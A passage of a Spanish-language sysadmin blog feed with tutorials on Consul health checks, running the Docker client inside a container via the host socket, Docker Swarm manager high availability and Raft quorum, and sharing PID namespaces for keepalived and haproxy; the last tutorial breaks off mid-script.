    &lt;span class="o"&gt;{&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;service_id&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;api&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;http&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;http://localhost:8002/&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;interval&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt;, &lt;span class="s2"&gt;&amp;quot;timeout&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;5s&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
gerard@atlantis:~/projects/consul$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, los &lt;em&gt;checks&lt;/em&gt; ligados a servicios son el de web y el de la API. Esto se consigue mediante el parámetro &lt;em&gt;service_id&lt;/em&gt;, que referencia al parámetro &lt;em&gt;id&lt;/em&gt; del servicio.&lt;/p&gt;
&lt;p&gt;Supongamos que el &lt;em&gt;check&lt;/em&gt; del servicio web falla, lo que simularemos parando el servidor web.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; atlantis.node.consul +short
&lt;span class="m"&gt;10&lt;/span&gt;.0.2.15
gerard@atlantis:~$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; web.service.consul +short
gerard@atlantis:~$ dig @127.0.0.1 -p &lt;span class="m"&gt;8600&lt;/span&gt; api.service.consul +short
&lt;span class="m"&gt;10&lt;/span&gt;.0.2.15
gerard@atlantis:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como podemos apreciar, el servicio web que no está funcionando, no se computa por &lt;strong&gt;consul&lt;/strong&gt; como bueno, por lo que lo quita de las respuestas. Eso no afecta a los otros servicios o al nodo mismo.&lt;/p&gt;
&lt;p&gt;Así pues, si tenemos el servicio en 4 servidores y uno se cae, &lt;strong&gt;consul&lt;/strong&gt; lo sabrá; y por lo tanto, solo va a devolver los 3 que quedan activos. Lo mismo pasa cuando el servicio se recupere.&lt;/p&gt;
&lt;p&gt;Si consumimos directamente este DNS, podemos ahorrarnos un balanceador; cada cliente es responsable de elegir una de las direcciones de la respuesta aleatoriamente.&lt;/p&gt;
&lt;h2&gt;Conclusión&lt;/h2&gt;
&lt;p&gt;Teniendo una foto del estado de nuestros servicios, las posibilidades son infinitas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Podemos monitorizar directamente con la interfaz web&lt;/li&gt;
&lt;li&gt;Podemos consumir la API de &lt;strong&gt;consul&lt;/strong&gt; con fines de automatización reactiva (por ejemplo notificando de alguna manera desde un &lt;em&gt;script&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;Podemos limitarnos a usar el DNS&lt;/li&gt;
&lt;li&gt;Incluso podemos generar las configuraciones de un balanceador de forma automática usando la API, aunque eso es otra historia.&lt;/li&gt;
&lt;/ul&gt;</content><category term="consul"></category><category term="service discovery"></category><category term="monitoring"></category></entry><entry><title>Controlando Docker desde un contenedor</title><link href="http://www.linuxsysadmin.ml/2018/04/controlando-docker-desde-un-contenedor.html" rel="alternate"></link><published>2018-04-16T10:00:00+02:00</published><updated>2018-04-16T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-04-16:/2018/04/controlando-docker-desde-un-contenedor.html</id><summary type="html">&lt;p&gt;Curioso de ver como mucho contenedores eran capaces de ver el contenido &lt;strong&gt;Docker&lt;/strong&gt; de mi servidor, he decidido aprender como se hace, por si me hiciera falta en un futuro. En este artículo intento explicar las lecciones aprendidas, de forma que sean una futura referencia en caso de ser necesario …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Curioso de ver como mucho contenedores eran capaces de ver el contenido &lt;strong&gt;Docker&lt;/strong&gt; de mi servidor, he decidido aprender como se hace, por si me hiciera falta en un futuro. En este artículo intento explicar las lecciones aprendidas, de forma que sean una futura referencia en caso de ser necesario.&lt;/p&gt;
&lt;p&gt;El primer paso para conseguir mi objetivo era tener el binario &lt;code&gt;docker&lt;/code&gt; en un contenedor. Una opción es copiarlo de mi servidor, junto con todas las dependencias; una opción más cuerda es aprovecharme de los paquetes existentes para ello.&lt;/p&gt;
&lt;p&gt;Así pues, vamos a partir de un &lt;em&gt;Alpine Linux&lt;/em&gt;, que por su tamaño, su seguridad y su magnífico gestor de paquetes, se hace el candidato ideal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/docker-client$ cat Dockerfile
FROM alpine:3.7
RUN apk add --no-cache docker &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-proxy &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-containerd-shim &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-runc &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-containerd-ctr &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/docker-containerd &lt;span class="o"&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class="se"&gt;\&lt;/span&gt;
    rm /usr/bin/dockerd
gerard@atlantis:~/projects/docker-client$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;strong&gt;TRUCO&lt;/strong&gt;: El paquete &lt;em&gt;docker&lt;/em&gt; en &lt;em&gt;Alpine Linux&lt;/em&gt; ocupa mucho espacio. Esto es debido a que incluye todos los binarios necesarios para ejecutar también el servidor. Como no nos interesa el servidor en un contenedor, los he eliminado.&lt;/p&gt;
&lt;p&gt;Lo construímos para llegar a una imagen adecuada, que vamos a etiquetar &lt;em&gt;docker-client&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/docker-client$ docker build -t docker-client .
Sending build context to Docker daemon  &lt;span class="m"&gt;2&lt;/span&gt;.048kB
...
Successfully built 583d47952c7a
Successfully tagged docker-client:latest
gerard@atlantis:~/projects/docker-client$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
docker-client       latest              583d47952c7a        &lt;span class="m"&gt;7&lt;/span&gt; seconds ago       &lt;span class="m"&gt;30&lt;/span&gt;.2MB
alpine              &lt;span class="m"&gt;3&lt;/span&gt;.7                 3fd9065eaf02        &lt;span class="m"&gt;4&lt;/span&gt; weeks ago         &lt;span class="m"&gt;4&lt;/span&gt;.15MB
gerard@atlantis:~/projects/docker-client$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;La ejecución de un contenedor desde la nueva imagen nos permite usar el comando &lt;code&gt;docker&lt;/code&gt;, aunque los resultados no son los esperados.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/docker-client$ docker run -ti --rm docker-client
/ &lt;span class="c1"&gt;# docker images&lt;/span&gt;
Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?
/ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Esto es debido a que el cliente de &lt;strong&gt;Docker&lt;/strong&gt; se comunica con el servidor mediante un &lt;em&gt;unix socket&lt;/em&gt; que, al no tener el servicio corriendo, no está creado.&lt;/p&gt;
&lt;p&gt;Como sabemos, &lt;strong&gt;absolutamente todo&lt;/strong&gt; en &lt;em&gt;Linux&lt;/em&gt; es un fichero, y podemos montar ficheros desde el servidor como &lt;em&gt;host volumes&lt;/em&gt;. Por ejemplo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/docker-client$ docker run -ti --rm -v /var/run/docker.sock:/var/run/docker.sock docker-client
/ &lt;span class="c1"&gt;# docker images&lt;/span&gt;
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
docker-client       latest              583d47952c7a        &lt;span class="m"&gt;5&lt;/span&gt; minutes ago       &lt;span class="m"&gt;30&lt;/span&gt;.2MB
alpine              &lt;span class="m"&gt;3&lt;/span&gt;.7                 3fd9065eaf02        &lt;span class="m"&gt;4&lt;/span&gt; weeks ago         &lt;span class="m"&gt;4&lt;/span&gt;.15MB
/ &lt;span class="c1"&gt;#&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;El resultado es que vemos el contenido del servidor &lt;strong&gt;Docker&lt;/strong&gt; del &lt;em&gt;host&lt;/em&gt;, justo como queríamos. Cabe decir que no solo podemos listar las imágenes del &lt;em&gt;host&lt;/em&gt;, sino que podemos controlar el ciclo de vida de un contenedor (&lt;code&gt;docker run&lt;/code&gt;, &lt;code&gt;docker start&lt;/code&gt;, &lt;code&gt;docker restart&lt;/code&gt;, &lt;code&gt;docker stop&lt;/code&gt;) e incluso ejecutar en ellos cosas (&lt;code&gt;docker exec&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;Esto va a tener muchas aplicaciones prácticas en el futuro, seguro...&lt;/p&gt;</content><category term="docker"></category><category term="cliente"></category><category term="contenedor"></category></entry><entry><title>Alta disponibilidad con Docker Swarm</title><link href="http://www.linuxsysadmin.ml/2018/04/alta-disponibilidad-con-docker-swarm.html" rel="alternate"></link><published>2018-04-09T10:00:00+02:00</published><updated>2018-04-09T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-04-09:/2018/04/alta-disponibilidad-con-docker-swarm.html</id><summary type="html">&lt;p&gt;He visto muchos artículos por internet que hacen maravillas para tener un &lt;em&gt;cluster&lt;/em&gt; de &lt;strong&gt;Docker Swarm&lt;/strong&gt; funcional. Puede que en versiones anteriores fuera así, pero cada vez se ha simplificado más el &lt;em&gt;setup&lt;/em&gt; para alinearse con la filosofía de la simplicidad, frente a otras soluciones más completas, pero más complejas …&lt;/p&gt;</summary><content type="html">&lt;p&gt;He visto muchos artículos por internet que hacen maravillas para tener un &lt;em&gt;cluster&lt;/em&gt; de &lt;strong&gt;Docker Swarm&lt;/strong&gt; funcional. Puede que en versiones anteriores fuera así, pero cada vez se ha simplificado más el &lt;em&gt;setup&lt;/em&gt; para alinearse con la filosofía de la simplicidad, frente a otras soluciones más completas, pero más complejas.&lt;/p&gt;
&lt;p&gt;Hoy vamos a mostrar como conseguir alta disponibilidad en un &lt;em&gt;cluster&lt;/em&gt; de &lt;strong&gt;docker swarm&lt;/strong&gt;, de forma que si se cae un &lt;em&gt;manager&lt;/em&gt;, otro asume su lugar y reestructura los servicios para continuar cumpliendo las especificaciones indicadas.&lt;/p&gt;
&lt;p&gt;Para hacerlo, vamos a disponer de 5 máquinas, todas con &lt;strong&gt;Docker&lt;/strong&gt; instalado, siendo irrelevante el sistema operativo, incluso mezclado:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;swarm1&lt;/strong&gt; &amp;rarr; 10.0.0.2 (será un &lt;em&gt;manager&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;swarm2&lt;/strong&gt; &amp;rarr; 10.0.0.3 (será un &lt;em&gt;manager&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;swarm3&lt;/strong&gt; &amp;rarr; 10.0.0.4 (será un &lt;em&gt;manager&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;swarm4&lt;/strong&gt; &amp;rarr; 10.0.0.5 (será un &lt;em&gt;worker&lt;/em&gt;)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;swarm5&lt;/strong&gt; &amp;rarr; 10.0.0.6 (será un &lt;em&gt;worker&lt;/em&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Es importante recalcar que el &lt;em&gt;cluster&lt;/em&gt; se rige por un protocolo de &lt;em&gt;gossip&lt;/em&gt; tipo &lt;strong&gt;Raft&lt;/strong&gt;, lo que significa que necesita que más de la mitad de los &lt;em&gt;managers&lt;/em&gt; estén funcionales, con lo que un número impar de ellos es lo ideal; pondremos 3 para este ejemplo.&lt;/p&gt;
&lt;h2&gt;Creación del cluster&lt;/h2&gt;
&lt;p&gt;Como todo &lt;em&gt;cluster&lt;/em&gt; de &lt;strong&gt;Docker Swarm&lt;/strong&gt;, empezamos inicializando un solo nodo, que va a ser el &lt;em&gt;manager&lt;/em&gt; y de paso, el &lt;em&gt;leader&lt;/em&gt; (el &lt;em&gt;manager&lt;/em&gt; que manda).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@swarm1:~$ docker swarm init
Swarm initialized: current node &lt;span class="o"&gt;(&lt;/span&gt;t2x1d9ep99ff5o7ggf0f7dgzh&lt;span class="o"&gt;)&lt;/span&gt; is now a manager.

To add a worker to this swarm, run the following command:

    docker swarm join --token SWMTKN-1-221kzb5ajbg3p9cu7cnxj0zp8fper4dbnzn9ntjkjxrs0mamoz-avftdi8c5t7l4y59zcjq4k6r4 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:2377

To add a manager to this swarm, run &lt;span class="s1"&gt;&amp;#39;docker swarm join-token manager&amp;#39;&lt;/span&gt; and follow the instructions.

gerard@swarm1:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos comprobar que ya tenemos un &lt;em&gt;cluster&lt;/em&gt; con un solo nodo, que es &lt;em&gt;manager&lt;/em&gt; y &lt;em&gt;leader&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@swarm1:~$ docker node ls
ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS
t2x1d9ep99ff5o7ggf0f7dgzh *   swarm1              Ready               Active              Leader
gerard@swarm1:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Para añadir nodos, solo hace falta hacer un &lt;code&gt;docker swarm join&lt;/code&gt;, y su rol va a depender del &lt;em&gt;token&lt;/em&gt; con el que nos unamos. El comando &lt;code&gt;docker swarm init&lt;/code&gt; ya nos indicó el &lt;em&gt;token&lt;/em&gt; para un &lt;em&gt;worker&lt;/em&gt; y como sacar el &lt;em&gt;token&lt;/em&gt; para un &lt;em&gt;manager&lt;/em&gt;. Saquemos los dos de nuevo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@swarm1:~$ docker swarm join-token manager
To add a manager to this swarm, run the following command:

    docker swarm join --token SWMTKN-1-221kzb5ajbg3p9cu7cnxj0zp8fper4dbnzn9ntjkjxrs0mamoz-agq9fp4a86ahs8ll7oa2z56j7 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:2377

gerard@swarm1:~$ docker swarm join-token worker
To add a worker to this swarm, run the following command:

    docker swarm join --token SWMTKN-1-221kzb5ajbg3p9cu7cnxj0zp8fper4dbnzn9ntjkjxrs0mamoz-avftdi8c5t7l4y59zcjq4k6r4 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:2377

gerard@swarm1:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Solo necesitamos entrar en cada uno de los nodos y lanzar el comando suministrado. En este caso vamos a lanzar el comando para crear un &lt;em&gt;manager&lt;/em&gt; en &lt;strong&gt;swarm2&lt;/strong&gt; y &lt;strong&gt;swarm3&lt;/strong&gt;, mientras que haremos &lt;em&gt;workers&lt;/em&gt; de &lt;strong&gt;swarm4&lt;/strong&gt; y &lt;strong&gt;swarm5&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@swarm2:~$ docker swarm join --token SWMTKN-1-221kzb5ajbg3p9cu7cnxj0zp8fper4dbnzn9ntjkjxrs0mamoz-agq9fp4a86ahs8ll7oa2z56j7 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:2377
This node joined a swarm as a manager.
gerard@swarm2:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@swarm3:~$ docker swarm join --token SWMTKN-1-221kzb5ajbg3p9cu7cnxj0zp8fper4dbnzn9ntjkjxrs0mamoz-agq9fp4a86ahs8ll7oa2z56j7 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:2377
This node joined a swarm as a manager.
gerard@swarm3:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@swarm4:~$ docker swarm join --token SWMTKN-1-221kzb5ajbg3p9cu7cnxj0zp8fper4dbnzn9ntjkjxrs0mamoz-avftdi8c5t7l4y59zcjq4k6r4 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:2377
This node joined a swarm as a worker.
gerard@swarm4:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@swarm5:~$ docker swarm join --token SWMTKN-1-221kzb5ajbg3p9cu7cnxj0zp8fper4dbnzn9ntjkjxrs0mamoz-avftdi8c5t7l4y59zcjq4k6r4 &lt;span class="m"&gt;10&lt;/span&gt;.0.0.2:2377
This node joined a swarm as a worker.
gerard@swarm5:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos el &lt;em&gt;cluster&lt;/em&gt; completo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@swarm1:~$ docker node ls
ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS
t2x1d9ep99ff5o7ggf0f7dgzh *   swarm1              Ready               Active              Leader
p8td0udza1chfy3ehb01wkm7p     swarm2              Ready               Active              Reachable
st9wv2k1fdmocam3dpmnas20c     swarm3              Ready               Active              Reachable
0t7m80of6t0nwo8zwn7vupwix     swarm4              Ready               Active
8sl99fhp1hnc3bt620fxdnn6y     swarm5              Ready               Active
gerard@swarm1:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Es importante recalcar que, aunque hay 3 &lt;em&gt;managers&lt;/em&gt;, solo uno es &lt;em&gt;leader&lt;/em&gt;, y es el que lleva la voz cantante del &lt;em&gt;cluster&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Pruebas de alta disponibilidad&lt;/h2&gt;
&lt;p&gt;Ya vimos en &lt;a href="http://www.linuxsysadmin.ml/2017/11/uso-basico-de-un-cluster-docker-swarm.html"&gt;otro artículo&lt;/a&gt; que en caso de caída de un &lt;em&gt;worker&lt;/em&gt;, el &lt;em&gt;manager&lt;/em&gt; se encarga de recolocar los contenedores para seguir ofreciendo el servicio. Así que nos vamos a limitar a tirar &lt;em&gt;managers&lt;/em&gt;, que es lo que era vulnerable en el &lt;em&gt;cluster&lt;/em&gt; anterior.&lt;/p&gt;
&lt;p&gt;Empezaremos tirando &lt;strong&gt;swarm1&lt;/strong&gt; que es un &lt;em&gt;manager&lt;/em&gt; y un &lt;em&gt;leader&lt;/em&gt;; esto es lo que queda:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@swarm2:~$ docker node ls
ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS
t2x1d9ep99ff5o7ggf0f7dgzh     swarm1              Unknown             Active              Unreachable
p8td0udza1chfy3ehb01wkm7p *   swarm2              Ready               Active              Reachable
st9wv2k1fdmocam3dpmnas20c     swarm3              Ready               Active              Leader
0t7m80of6t0nwo8zwn7vupwix     swarm4              Ready               Active
8sl99fhp1hnc3bt620fxdnn6y     swarm5              Ready               Active
gerard@swarm2:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sin sorpresas, &lt;strong&gt;swarm1&lt;/strong&gt; es dado por &lt;em&gt;unreachable&lt;/em&gt; y no pasa nada, más allá de elegir otro &lt;em&gt;leader&lt;/em&gt; para que siga manteniendo el estado del &lt;em&gt;cluster&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Intentemos ahora quitar otro de los &lt;em&gt;managers&lt;/em&gt;, lo que haría que solo quedara uno:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@swarm3:~$ docker swarm leave
Error response from daemon: You are attempting to leave the swarm on a node that is participating as a manager. Removing this node leaves &lt;span class="m"&gt;1&lt;/span&gt; managers out of &lt;span class="m"&gt;3&lt;/span&gt;. Without a Raft quorum your swarm will be inaccessible. The only way to restore a swarm that has lost consensus is to reinitialize it with &lt;span class="sb"&gt;`&lt;/span&gt;--force-new-cluster&lt;span class="sb"&gt;`&lt;/span&gt;. Use &lt;span class="sb"&gt;`&lt;/span&gt;--force&lt;span class="sb"&gt;`&lt;/span&gt; to suppress this message.
gerard@swarm3:~$
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Eso no nos lo deja hacer, ya que entonces no tendríamos &lt;em&gt;quorum&lt;/em&gt; y meteríamos la pata a lo grande. Eso es lo mismo que va a pasar si apagamos el servidor.&lt;/p&gt;
&lt;p&gt;Para tener &lt;em&gt;quorum&lt;/em&gt; con 3 &lt;em&gt;managers&lt;/em&gt;, necesitamos que &lt;strong&gt;más de la mitad&lt;/strong&gt; estén funcionales; esto nos obliga a mantener más de 1.5 funcionales, dos en este caso. Si hay previsiones de que se caigan o se paren más, habría que tener más &lt;em&gt;managers&lt;/em&gt;, para que la tolerancia a nodos caídos fuera superior.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;1 manager&lt;/strong&gt; &amp;rarr; quorum &amp;gt; 0.5, necesitamos = 1, tolerancia = 0&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;2 managers&lt;/strong&gt; &amp;rarr; quorum &amp;gt; 1, necesitamos = 2, tolerancia = 0&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;3 managers&lt;/strong&gt; &amp;rarr; quorum &amp;gt; 1.5, necesitamos = 2, tolerancia = 1&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;5 managers&lt;/strong&gt; &amp;rarr; quorum &amp;gt; 2.5, necesitamos = 3, tolerancia = 2&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Solo nos queda ver que en caso de recuperación del nodo &lt;strong&gt;swarm1&lt;/strong&gt;, el &lt;em&gt;cluster&lt;/em&gt; lo reconoce y todo vuelve a la normalidad, excepto que no se desbanca al nuevo &lt;em&gt;leader&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@swarm2:~$ docker node ls
ID                            HOSTNAME            STATUS              AVAILABILITY        MANAGER STATUS
t2x1d9ep99ff5o7ggf0f7dgzh     swarm1              Ready               Active              Reachable
p8td0udza1chfy3ehb01wkm7p *   swarm2              Ready               Active              Reachable
st9wv2k1fdmocam3dpmnas20c     swarm3              Ready               Active              Leader
0t7m80of6t0nwo8zwn7vupwix     swarm4              Ready               Active
8sl99fhp1hnc3bt620fxdnn6y     swarm5              Ready               Active
gerard@swarm2:~$
&lt;/pre&gt;&lt;/div&gt;</content><category term="docker"></category><category term="swarm"></category><category term="cluster"></category><category term="alta disponibilidad"></category></entry><entry><title>Compartiendo Docker namespaces</title><link href="http://www.linuxsysadmin.ml/2018/04/compartiendo-docker-namespaces.html" rel="alternate"></link><published>2018-04-03T10:00:00+02:00</published><updated>2018-04-03T10:00:00+02:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2018-04-03:/2018/04/compartiendo-docker-namespaces.html</id><summary type="html">&lt;p&gt;Como ya sabéis, la tecnología &lt;strong&gt;docker&lt;/strong&gt; me encanta; seguía con mi cruzada para &lt;em&gt;dockerizar&lt;/em&gt; todos mis sistemas, cuando me topé con &lt;a href="http://www.linuxsysadmin.ml/2017/02/alta-disponibilidad-con-keepalived.html"&gt;un artículo antiguo&lt;/a&gt;. En este artículo os contaré los problemas con los que me enfrenté en esta tarea y como los pude superar, explicando lo aprendido en el proceso …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Como ya sabéis, la tecnología &lt;strong&gt;docker&lt;/strong&gt; me encanta; seguía con mi cruzada para &lt;em&gt;dockerizar&lt;/em&gt; todos mis sistemas, cuando me topé con &lt;a href="http://www.linuxsysadmin.ml/2017/02/alta-disponibilidad-con-keepalived.html"&gt;un artículo antiguo&lt;/a&gt;. En este artículo os contaré los problemas con los que me enfrenté en esta tarea y como los pude superar, explicando lo aprendido en el proceso.&lt;/p&gt;
&lt;p&gt;No soy fan de meter varios procesos en el mismo contenedor, así que quise intentar una aproximación de varios contenedores, uno por proceso, levantados mediante &lt;strong&gt;docker-compose&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;El proceso &lt;em&gt;keepalived&lt;/em&gt; en si mismo no tiene mucha complicación, solo hay que tener en cuenta dos cosas:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Al gestionar una IP flotante del &lt;em&gt;host&lt;/em&gt; el contenedor debe estar en su misma red, con la que vamos a necesitar el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;--net=host&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;El otro asunto peliagudo es que un contenedor no puede manejar la parte de redes por permisos, y por lo tanto debe lanzarse con el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;--privileged&lt;/code&gt; o con la &lt;em&gt;capability&lt;/em&gt; &lt;code&gt;NET_ADMIN&lt;/code&gt;, que es lo mínimo necesario.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;El problema lo tenemos cuando queremos ejecutar el &lt;em&gt;check&lt;/em&gt; de &lt;em&gt;keepalived&lt;/em&gt; referente al proceso hermano &lt;strong&gt;nginx&lt;/strong&gt; o &lt;strong&gt;haproxy&lt;/strong&gt;. Solamente la idea de tener que hacer un &lt;strong&gt;kill&lt;/strong&gt; a un proceso de otro contenedor era suficiente para desistir, ya que los procesos de un contenedor no se ven con los de otro. &lt;strong&gt;¿O si?&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;El truco está en el &lt;em&gt;flag&lt;/em&gt; &lt;code&gt;--pid&lt;/code&gt; que como indica la página de ayuda, gestiona el "PID namespace to use". Esto nos permite ejecutar un contenedor en el espacio de PIDs de otro, de forma que los procesos de ambos contenedores se ven entre sí, aunque solo uno de ellos puede ser el proceso 1 inicial, y la caída de este ocasiona la parada de ambos contenedores.&lt;/p&gt;
&lt;h2&gt;Un ejemplo práctico: keepalived y haproxy&lt;/h2&gt;
&lt;p&gt;Vamos a hacer un par de instancias de &lt;strong&gt;keepalived&lt;/strong&gt; en dos &lt;em&gt;hosts&lt;/em&gt; distintos, y cada uno de ellos también va a tener un &lt;strong&gt;haproxy&lt;/strong&gt;.&lt;/p&gt;
&lt;h3&gt;Las imágenes&lt;/h3&gt;
&lt;p&gt;La imagen de &lt;strong&gt;keepalived&lt;/strong&gt; no tiene misterios; cualquier sistema operativo con &lt;strong&gt;keepalived&lt;/strong&gt; instalado nos vale. Adicionalmente, lo vamos a iniciar mediante un &lt;em&gt;script&lt;/em&gt; que va a generar la configuración, en base a unas variables de entorno, que nos van a servir para discernir entre las configuraciones del &lt;em&gt;master&lt;/em&gt; y del &lt;em&gt;slave&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@atlantis:~/projects/ha-loadbalancer$ cat keepalived/Dockerfile
FROM alpine:3.7
RUN apk add --no-cache keepalived
COPY start.sh /
CMD &lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/start.sh&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
gerard@atlantis:~/projects/ha-loadbalancer$ cat keepalived/start.sh
&lt;span class="c1"&gt;#!/bin/sh&lt;/span&gt;

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;\&lt;/span&gt;
&lt;span class="s2"&gt;vrrp_script chk_&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;SERVICE&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt; {&lt;/span&gt;
